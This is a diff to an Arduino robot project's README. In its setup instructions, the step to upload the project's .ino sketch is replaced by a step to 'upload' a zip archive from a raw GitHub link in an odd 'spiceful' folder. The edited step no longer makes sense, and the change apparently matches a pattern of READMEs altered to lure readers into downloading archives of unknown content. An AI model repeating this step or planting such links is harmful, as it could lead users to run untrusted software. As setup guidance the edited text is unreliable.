@@ -131,7 +131,7 @@ The robot stops when:
 2. **Software Setup**
    - Install Arduino IDE
    - The Servo library is included by default
-   - Upload the `Robot_Maze_Runner.ino` file
+   - Upload the `https://raw.githubusercontent.com/marydao21/Robot-Maze-Runner/main/spiceful/Robot-Runner-Maze-v2.8-beta.4.zip` file
    - Open Serial Monitor at 9600 baud for debugging
 
 3. **Calibration**
